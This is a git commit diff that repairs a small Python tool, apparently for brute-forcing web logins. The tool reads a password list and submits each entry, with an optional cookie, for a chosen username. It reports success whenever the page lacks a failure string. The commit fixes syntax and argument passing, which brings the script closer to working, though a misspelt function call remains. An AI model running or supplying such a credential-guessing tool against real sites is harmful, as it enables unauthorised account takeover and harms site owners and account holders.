2a4707502dd6f51d69d27076fc18431474af8249
RandooDevoo <rand95user@proton.me>
2023-05-20 12:34:15 +0200

    Made some changes

--- tools/webrut.py
+++ tools/webrut.py
@@ -1,31 +1,34 @@
 import requests
 from termcolor import colored
 
-url = input("enter page url")
-username=input("enter username for the account to brutforce")
-passwordfile=input("enter password file to use")
-loginfail=input("enter string that occurs when login fail")
-cookievalue=input("enter cookie value(optional)")
+url = input("enter page url ")
+username=input("enter username for the account to brutforce ")
+passwordfile=input("enter password file to use ")
+loginfail=input("enter string that occurs when login fail ")
+cookievalue=input("enter cookie value(optional) ")
 
-def cracking(username,url) :
+def cracking(username, url, passwords) :
     for password in passwords:
         password=password.strip()
-        print(colored(("trying"+password) , "green"))
+        print(colored(("trying "+password) , "green"))
         data={"username":username,"password":password,"Login":"submit"}
         if cookievalue != "":
-            response=requests.get(url,params={"username":username,"password":password,"Login":"Login"} < cookies={"cookie":cookievalue})
+            response = requests.get(url, params={"username": username, "password": password, "Login": "Login"}, cookies={"cookie": cookievalue})
+
         else:
             response=requests.post(url,data=data)
         
         if loginfail in response.content.decode():
             pass
         else:
-            print(colored(("found username"+username) , "blue" ))
-            print(coloured(("found password"+password) , "blue" ))
+            print(colored(("found username "+username) , "blue" ))
+            print(coloured(("found password "+password) , "blue" ))
 
 
 
-with open(passwordfile,"r") as passwords :
-    cracking(username,url)
+with open(passwordfile, "r") as password_file:
+    passwords = password_file.readlines()
+    cracking(username, url, passwords)
+
 
 print("password not in list")
